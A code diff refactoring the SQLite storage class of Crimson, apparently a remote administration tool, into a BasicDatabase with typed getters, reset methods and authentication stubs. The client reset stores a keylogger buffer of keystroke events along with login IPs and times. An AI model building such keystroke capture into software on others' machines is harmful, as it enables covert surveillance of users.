@@ -18,14 +18,16 @@
 package com.subterranean_security.crimson.core.storage;
 
 import java.io.File;
+import java.io.IOException;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
 import java.sql.SQLException;
-import java.sql.Statement;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.HashMap;
+import java.util.NoSuchElementException;
 
 import javax.sql.rowset.serial.SerialException;
 
@@ -33,45 +35,74 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.core.Common;
+import com.subterranean_security.crimson.core.misc.MemList;
 import com.subterranean_security.crimson.core.misc.ObjectTransfer;
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.Report.MI_Report;
 import com.subterranean_security.crimson.core.util.RandomUtil;
+import com.subterranean_security.crimson.sv.permissions.ViewerPermissions;
+import com.subterranean_security.crimson.sv.profile.ClientProfile;
 
-public abstract class Database extends Thread implements AutoCloseable {
-	private static final Logger log = LoggerFactory.getLogger(Database.class);
+public class BasicDatabase implements StorageFacility {
+	private static final Logger log = LoggerFactory.getLogger(BasicDatabase.class);
 
 	private HashMap<String, Object> map = new HashMap<String, Object>();
 	private HashMap<Integer, Object> heap = new HashMap<Integer, Object>();
 
 	protected Connection db;
-	public File dfile;
+	public File sqlite;
 
-	public void init(File dfile) throws Exception {
-		this.dfile = dfile;
+	public BasicDatabase(String pref, File sqlite) {
+		this.sqlite = sqlite;
+	}
 
-		try {
-			// load the driver if unloaded
-			Class.forName("org.sqlite.JDBC");
-		} catch (ClassNotFoundException e) {
-			log.error("Missing Dependency: sqlite");
-			throw e;
+	@Override
+	public void initialize() throws IOException, ClassNotFoundException, SQLException {
+		initSql();
+	}
+
+	public void initSql() throws IOException, ClassNotFoundException, SQLException {
+
+		// load driver
+		Class.forName("org.sqlite.JDBC");
+
+		// create database if needed
+		sqlite.createNewFile();
+
+		// create connection
+		db = DriverManager.getConnection("jdbc:sqlite:" + sqlite.getAbsolutePath());
+
+		// construct database if needed
+		if (!isTableConstructed()) {
+			construct();
 		}
-
-		try {
-			db = DriverManager.getConnection("jdbc:sqlite:" + dfile.getAbsolutePath());
-		} catch (SQLException e) {
-			log.error("Could not connect to database: " + dfile.getAbsolutePath());
-			throw new Exception("Could not create database: " + dfile.getAbsolutePath());
-		}
-
-		log.debug("Initialized database: " + dfile.getAbsolutePath());
 
 		// increase run count
+		// try {
+		// store("runs", getInteger("runs") + 1);
+		// } catch (Exception e) {
+		// log.error("Could not update run count");
+		// e.printStackTrace();
+		// }
+	}
+
+	/**
+	 * Construct a basic database
+	 * 
+	 * @throws SQLException
+	 */
+	private void construct() throws SQLException {
+		execute("CREATE TABLE `map` (`Name` TEXT UNIQUE, `Data` BLOB);");
+		execute("INSERT INTO `map` VALUES ('runs','0');");
+		execute("CREATE TABLE `heap` (`Id` INTEGER PRIMARY KEY AUTOINCREMENT, `Data`  BLOB);");
+	}
+
+	private boolean isTableConstructed() {
 		try {
-			storeObject("runs", getInteger("runs") + 1);
-		} catch (Exception e) {
-			log.error("Could not update run count");
+			return db.getMetaData().getTables(null, null, "map", null).next();
+		} catch (SQLException e) {
 			e.printStackTrace();
+			return false;
 		}
 	}
 
@@ -104,9 +135,14 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @return
 	 * @throws Exception
 	 */
-	public Object get(int id) throws Exception {
+	public Object getObject(int id) throws SQLException, NoSuchElementException {
 		if (!heap.containsKey(id)) {
-			heap.put(id, ObjectTransfer.Default.deserialize(query(id)));
+			try {
+				heap.put(id, ObjectTransfer.Default.deserialize(query(id)));
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
 		}
 		return heap.get(id);
 
@@ -119,7 +155,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @return
 	 * @throws Exception
 	 */
-	private Object query(String key) throws Exception {
+	private Object query(String key) throws SQLException, NoSuchElementException {
 
 		// get the object from the database
 		PreparedStatement stmt = db.prepareStatement("SELECT * FROM map WHERE `Name`=?");
@@ -127,10 +163,15 @@ public abstract class Database extends Thread implements AutoCloseable {
 
 		ResultSet rs = stmt.executeQuery();
 		if (!rs.next()) {
-			log.error("Key not found: " + key);
-			throw new Exception();
+			throw new NoSuchElementException();
 		} else {
-			return ObjectTransfer.Default.deserialize(rs.getBytes("Data"));
+			try {
+				return ObjectTransfer.Default.deserialize(rs.getBytes("Data"));
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+				return null;
+			}
 		}
 
 	}
@@ -142,7 +183,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @return
 	 * @throws Exception
 	 */
-	public String getString(String key) throws Exception {
+	public String getString(String key) throws SQLException, NoSuchElementException {
 
 		if (map.containsKey(key)) {
 			return (String) map.get(key);
@@ -154,8 +195,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 
 		ResultSet rs = stmt.executeQuery();
 		if (!rs.next()) {
-			log.error("Could not query key: " + key);
-			throw new Exception();
+			throw new NoSuchElementException();
 		} else {
 			return rs.getString("Data");
 		}
@@ -169,7 +209,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @return
 	 * @throws Exception
 	 */
-	public Long getLong(String key) throws Exception {
+	public long getLong(String key) throws SQLException, NoSuchElementException {
 
 		if (map.containsKey(key)) {
 			return (long) map.get(key);
@@ -181,8 +221,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 
 		ResultSet rs = stmt.executeQuery();
 		if (!rs.next()) {
-			log.error("Could not query key: " + key);
-			throw new Exception();
+			throw new NoSuchElementException();
 		} else {
 			return rs.getLong("Data");
 		}
@@ -196,7 +235,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @return
 	 * @throws Exception
 	 */
-	public Integer getInteger(String key) throws Exception {
+	public int getInteger(String key) throws SQLException, NoSuchElementException {
 
 		if (map.containsKey(key)) {
 			return (int) map.get(key);
@@ -208,8 +247,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 
 		ResultSet rs = stmt.executeQuery();
 		if (!rs.next()) {
-			log.error("Could not query key: " + key);
-			throw new Exception();
+			throw new NoSuchElementException();
 		} else {
 			return rs.getInt("Data");
 		}
@@ -223,7 +261,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @return
 	 * @throws Exception
 	 */
-	public Boolean getBoolean(String key) throws Exception {
+	public boolean getBoolean(String key) throws SQLException, NoSuchElementException {
 
 		if (map.containsKey(key)) {
 			return (boolean) map.get(key);
@@ -235,8 +273,7 @@ public abstract class Database extends Thread implements AutoCloseable {
 
 		ResultSet rs = stmt.executeQuery();
 		if (!rs.next()) {
-			log.error("Could not query key: " + key);
-			throw new Exception();
+			throw new NoSuchElementException();
 		} else {
 			return rs.getBoolean("Data");
 		}
@@ -250,7 +287,8 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @return
 	 * @throws Exception
 	 */
-	public Object getObject(String key) throws Exception {
+	@Override
+	public Object getObject(String key) throws SQLException, NoSuchElementException {
 		if (map.containsKey(key)) {
 			return map.get(key);
 		}
@@ -266,7 +304,8 @@ public abstract class Database extends Thread implements AutoCloseable {
 	 * @param s
 	 * @param o
 	 */
-	public void storeObject(String s, Object o) {
+	@Override
+	public void store(String s, Object o) {
 		synchronized (map) {
 			map.put(s, o);
 		}
@@ -286,6 +325,36 @@ public abstract class Database extends Thread implements AutoCloseable {
 
 	}
 
+	private int reserveRow() {
+		try {
+			String placeholder = RandomUtil.randString(64);
+			PreparedStatement stmt = db.prepareStatement("INSERT INTO heap(Data) VALUES (?)");
+			stmt.setBytes(1, placeholder.getBytes());
+			stmt.executeUpdate();
+
+			PreparedStatement stmt2 = db.prepareStatement("SELECT * FROM heap WHERE `Data`=?");
+			stmt2.setBytes(1, placeholder.getBytes());
+
+			ResultSet rs = stmt2.executeQuery();
+			if (!rs.next()) {
+
+				throw new Exception();
+			} else {
+				return rs.getInt("Id");
+			}
+		} catch (SerialException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (SQLException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return 0;
+	}
+
 	public void close() {
 		try {
 			flushMap();
@@ -303,19 +372,6 @@ public abstract class Database extends Thread implements AutoCloseable {
 		} catch (SQLException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
-		}
-
-	}
-
-	public boolean isFirstRun() {
-
-		try {
-			return (getInteger("runs") == 1);
-
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-			return true;
 		}
 
 	}
@@ -350,36 +406,6 @@ public abstract class Database extends Thread implements AutoCloseable {
 		}
 	}
 
-	private int reserveRow() {
-		try {
-			String placeholder = RandomUtil.randString(64);
-			PreparedStatement stmt = db.prepareStatement("INSERT INTO heap(Data) VALUES (?)");
-			stmt.setBytes(1, placeholder.getBytes());
-			stmt.executeUpdate();
-
-			PreparedStatement stmt2 = db.prepareStatement("SELECT * FROM heap WHERE `Data`=?");
-			stmt2.setBytes(1, placeholder.getBytes());
-
-			ResultSet rs = stmt2.executeQuery();
-			if (!rs.next()) {
-
-				throw new Exception();
-			} else {
-				return rs.getInt("Id");
-			}
-		} catch (SerialException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		} catch (SQLException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-		return 0;
-	}
-
 	public void delete(String key) {
 		synchronized (map) {
 			map.remove(key);
@@ -409,28 +435,100 @@ public abstract class Database extends Thread implements AutoCloseable {
 		}
 	}
 
-	protected void execute(String s) {
-		try {
-			Statement statement = db.createStatement();
-			statement.setQueryTimeout(4);
-			statement.executeUpdate(s);
-		} catch (SQLException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
+	public void execute(String s) throws SQLException {
+		db.createStatement().executeUpdate(s);
 	}
 
-	public void softReset() {
-		this.storeObject("error_reporting", true);
-		this.storeObject("reports.sent", 0);
-		this.storeObject("language", "en");
+	@Override
+	public String getString(int id) throws IOException {
+		// TODO Auto-generated method stub
+		return null;
 	}
 
-	public void hardReset() {
-		this.softReset();
-		this.storeObject("cvid", 0);
-		this.storeObject("reports.buffer", new ArrayList<MI_Report>());
-		this.storeObject("crimson.version", Common.version);
-		this.storeObject("crimson.build_number", Common.build);
+	@Override
+	public int getInteger(int id) throws IOException {
+		// TODO Auto-generated method stub
+		return 0;
 	}
+
+	@Override
+	public long getLong(int id) throws IOException {
+		// TODO Auto-generated method stub
+		return 0;
+	}
+
+	@Override
+	public boolean getBoolean(int id) throws IOException {
+		// TODO Auto-generated method stub
+		return false;
+	}
+
+	public void resetViewer() {
+		resetBasic();
+
+		store("close_on_tray", false);
+		store("show_eula", true);
+		store("show_helps", true);
+		store("show_detail", true);
+		store("detail.processor", true);
+		store("detail.nic", true);
+		store("detail.preview", false);
+		store("detail.map", false);
+		store("view.last", "list");
+		store("login.recents", new ArrayList<String>());
+		store("profiles.clients", new MemList<ClientProfile>());
+		store("keylog.treeview", false);
+	}
+
+	public void resetClient() {
+		resetBasic();
+
+		store("install.timestamp", new Date().getTime());
+		store("login-times", new ArrayList<Long>());
+		store("login-ips", new ArrayList<String>());
+
+		store("keylogger.buffer", new MemList<EV_KEvent>());
+	}
+
+	public void resetBasic() {
+		store("cvid", 0);
+		store("reports.buffer", new ArrayList<MI_Report>());
+		store("crimson.version", Common.version);
+		store("crimson.build_number", Common.build);
+
+		store("error_reporting", true);
+		store("reports.sent", 0);
+		store("language", "en");
+	}
+
+	@Override
+	// SERVER ONLY
+	public boolean userExists(String user) {
+		return false;
+	}
+
+	@Override
+	// SERVER ONLY
+	public String getSalt(String user) {
+		return null;
+	}
+
+	@Override
+	// SERVER ONLY
+	public boolean validLogin(String user, String password) {
+		return false;
+	}
+
+	@Override
+	// SERVER ONLY
+	public boolean changePassword(String user, String password) {
+		return false;
+	}
+
+	@Override
+	// SERVER ONLY
+	public boolean addLocalUser(String user, String password, ViewerPermissions permissions) {
+		return false;
+	}
+
 }
